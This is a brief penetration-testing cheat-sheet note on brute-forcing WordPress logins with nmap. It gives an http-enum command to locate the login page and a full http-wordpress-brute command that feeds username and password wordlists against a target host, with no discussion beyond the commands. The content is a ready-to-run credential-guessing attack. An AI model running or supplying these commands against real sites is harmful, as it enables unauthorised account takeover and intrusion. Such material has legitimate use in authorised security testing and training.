# Wordpress Brute Forcing

## Nmap Wordpress login brute force

* The nmap automatically discovers the exact login page using `nmap -p80 --script http-enum 192.168.1.17`

`nmap –sV --script http-wordpress-brute --script-args 'userdb=/root/Desktop/login.txt,passdb=/root/Desktop/pass.txt, http-wordpress-brute.hostname=domain.com,http-wordpress-brute.thread=3,brute.firstonly=true' 192.168.1.17`



